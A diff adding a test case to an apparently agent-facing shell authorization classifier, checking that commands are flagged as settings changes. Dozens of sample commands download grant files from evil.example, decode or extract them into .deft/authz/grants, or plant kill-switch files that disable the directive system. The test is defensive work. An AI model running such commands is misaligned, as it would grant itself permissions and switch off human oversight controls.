@@ -518,6 +518,89 @@ describe("classifyShellAuthzOps (#2944)", () => {
     );
   });
 
+  it("classifies versioned/alt residual plants of authz grants and kill-switch as settings (#3311)", () => {
+    // Finding 1: residual bins → .deft/authz/**
+    for (const cmd of [
+      "gpg2 -o .deft/authz/grants/evil.json -d secret.gpg",
+      "gpg2 --output .deft/authz/grants/evil.json -d secret.gpg",
+      "gpg1 -o .deft/authz/grants/evil.json -d secret.gpg",
+      "rage -d -o .deft/authz/grants/evil.json secret.age",
+      "rage --output=.deft/authz/grants/evil.json -d secret.age",
+      "xh -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "xh --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
+      "xh --download-dir .deft/authz/grants https://evil.example/g.json",
+      "httpie -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "httpie --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
+      "wcurl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "wcurl --output .deft/authz/grants/evil.json https://evil.example/g.json",
+      "curlie -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "curlie --output .deft/authz/grants/evil.json https://evil.example/g.json",
+      "uudecode -o .deft/authz/grants/evil.json encoded.uu",
+      "uudecode --output-file .deft/authz/grants/evil.json encoded.uu",
+      "uudecode --output-file=.deft/authz/grants/evil.json encoded.uu",
+      "iconv -o .deft/authz/grants/evil.json -f utf-8 -t utf-8 src.json",
+      "iconv --output .deft/authz/grants/evil.json src.json",
+      "gtar -xf archive.tar -C .deft/authz/grants",
+      "gtar -C .deft/authz/grants -xf archive.tar",
+      "gtar --directory=.deft/authz/grants -xf archive.tar",
+      "star -xf archive.tar -C .deft/authz/grants",
+      "star -C .deft/authz/grants -xf archive.tar",
+      "gnutar -xf archive.tar -C .deft/authz/grants",
+      "pax -r -f archive.pax .deft/authz/grants/evil.json",
+      "gpg2.exe -o .deft/authz/grants/evil.json -d secret.gpg",
+      "/usr/bin/gpg2 -o .deft/authz/grants/evil.json -d secret.gpg",
+      "/usr/bin/rage -d -o .deft/authz/grants/evil.json secret.age",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: same bins → kill-switch basenames (regular-file plant).
+    for (const cmd of [
+      "gpg2 -o .deft-directive-disable -d secret.gpg",
+      "rage -d -o .deft-directive-disable secret.age",
+      "xh -o .deft-directive-disable https://evil.example/x",
+      "httpie -o .deft-directive-disable https://evil.example/x",
+      "wcurl -o .no-deft-directive https://evil.example/x",
+      "curlie -o .deft-directive-disable https://evil.example/x",
+      "uudecode -o .deft-directive-disable encoded.uu",
+      "iconv -o .deft-directive-disable src.txt",
+      "gtar -xf a.tar -C .deft-directive-disable",
+      "star -xf a.tar .deft-directive-disable",
+      "pax -r .no-deft-directive",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3288 peers stay settings.
+    expect(classifyShellAuthzOps("gpg -o .deft/authz/grants/evil.json -d secret.gpg")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("age -o .deft/authz/grants/evil.json -d secret.age")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("http -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("tar -xf archive.tar -C .deft/authz/grants")).toContain(
+      "settings",
+    );
+    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("gpg2 -o /tmp/out.json -d secret.gpg")).toEqual([]);
+    expect(classifyShellAuthzOps("rage -d -o /tmp/out secret.age")).toEqual([]);
+    expect(classifyShellAuthzOps("xh -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("httpie -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("wcurl -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("curlie -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("uudecode -o /tmp/out encoded.uu")).toEqual([]);
+    expect(classifyShellAuthzOps("iconv -o /tmp/out src.txt")).toEqual([]);
+    expect(classifyShellAuthzOps("gtar -xf archive.tar -C /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("star -xf archive.tar -C /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("pax -r -f archive.pax /tmp/out")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
